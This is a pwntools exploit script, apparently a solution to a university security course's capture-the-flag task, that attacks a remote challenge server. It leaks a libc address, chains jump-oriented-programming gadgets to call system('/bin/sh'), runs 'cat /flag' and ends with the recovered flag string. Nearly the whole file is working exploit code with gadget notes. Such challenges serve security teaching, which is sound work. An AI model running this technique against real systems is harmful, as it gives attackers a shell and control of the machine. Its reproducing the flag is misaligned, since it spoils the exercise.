from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file vuln
b *(main)
b *(main+193)
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33628)

#p=remote("127.0.0.1", 1024)



#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
sleep(2)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)





p.recvuntil(b"~~8~~ ")
libc_addr = int(p.recvuntil(b" ").decode()) - 264080
print(hex(libc_addr))
print(hex(libc_addr+0x142c84))
print(hex(libc_addr+0x04c140))
p.recvline()

# use one_gadget and jump oriented programming to call it

# 0x681f3: pop rcx; add al, 0; add byte ptr [rax + 0x63], cl; or al, 0x8a; add rcx, rdx; jmp rcx;
# 0x142c84: pop rax; call rax;
# 0x04c140: one gadget

# 0x14f59d: pop rax; add rsp, 0x40; pop rbx; jmp rax;

# 0x13d6a0: jmp qword ptr [rbx + 0xf];
# 0x105c55: jmp qword ptr [rbx];

# 0x5acbd: pop rax; idiv edi; jmp qword ptr [rax];

# 0x2ed67: pop rax; mov rdi, qword ptr [rsp + 0x50]; mov rax, qword ptr [rsp + 0x20]; call rax;

# 0x82d3c: mov rax, qword ptr [rbx + 0x18]; add rsp, 0x10; pop rbx; jmp rax; 

# 0x13a97d: mov esi, ebp; mov rcx, rbx; xor eax, eax; pop rbx; pop rbp; jmp rcx;

#p.sendline(cyclic(400))





"""
payload  = b"A"*cyclic_find_bytes(0x61616163)
payload += p64(libc_addr+0x2ed67)
payload += p64(0)
payload += p64(libc_addr+1908736+0x40) #rbp value set to a writeable region in libc
payload += b"F"*(cyclic_find_bytes(0x6161616b)-len(payload))
payload += p64(libc_addr+0x82d3c)


#payload += cyclic(cyclic_find_bytes(0x64616166))
#p64(libc_addr+0xd509f)*
#mov    rdi, qword ptr [rsp + 0x50]     RDI, [0x7fffc23d1958] => 0x6161617461616173 ('saaataaa')
#mov    rax, qword ptr [rsp + 0x20]     RAX, [0x7fffc23d1928] => 0x6161616861616167 ('gaaahaaa')

payload_inner  = b"B"*cyclic_find_bytes(0x61616167)
payload_inner += p64(libc_addr+0xd509f)
payload_inner += b"C"*(cyclic_find_bytes(0x61616173)-len(payload_inner))
payload_inner += p64(0)
payload_inner += b"\x00"*(cyclic_find_bytes(0x64616166)-len(payload_inner))
payload += payload_inner

payload += p64(libc_addr+0x13a97d)
#payload += p64(libc_addr+0x04c140)
#payload += p64(libc_addr+0x04c140)
"""

libc = ELF("./libc.so.6")
libc.address = libc_addr

payload  = b"A"*cyclic_find_bytes(0x61616163)
payload += p64(libc_addr+0x2ed68)
payload += p64(0)
payload += p64(libc_addr+1908736+0x40) #rbp value set to a writeable region in libc
payload += b"F"*(cyclic_find_bytes(0x6161616b)-len(payload))
payload += p64(libc_addr+0x82d3c)


#payload += cyclic(cyclic_find_bytes(0x64616166))
#p64(libc_addr+0xd509f)*
#mov    rdi, qword ptr [rsp + 0x50]     RDI, [0x7fffc23d1958] => 0x6161617461616173 ('saaataaa')
#mov    rax, qword ptr [rsp + 0x20]     RAX, [0x7fffc23d1928] => 0x6161616861616167 ('gaaahaaa')

# I at first tried to solve this by calling a one_gadget which forced me to write a larger chain to fulfill the conditions - didn't work though as it crashed during the execution of the one_gadget
# then I realized I could have just called system("/bin/sh") for which there exists a simple gadget at 0x2ed68
# anyway, here is an overly complex jump gadget chain :D

payload_inner  = b"B"*(cyclic_find_bytes(0x61616167)-8)
payload_inner += p64(libc.symbols['system'])
payload_inner += b"C"*(cyclic_find_bytes(0x61616173)-len(payload_inner)-8)
payload_inner += p64(next(libc.search(b'/bin/sh')))
payload_inner += b"\x00"*((cyclic_find_bytes(0x64616166)-len(payload_inner)))
payload += payload_inner

payload += p64(libc_addr+0x13a97d)


p.sendline(payload)

#p.sendline(b"S")
#p.sendline(b"0")

p.sendline(b"cat /flag")

p.interactive()


#softsec{hxZCeUp02kPJtev6UdCDUEBd-OH6LF3XsLG2h8mEzQrnjsAfVl7jIlKykzsuLPsC}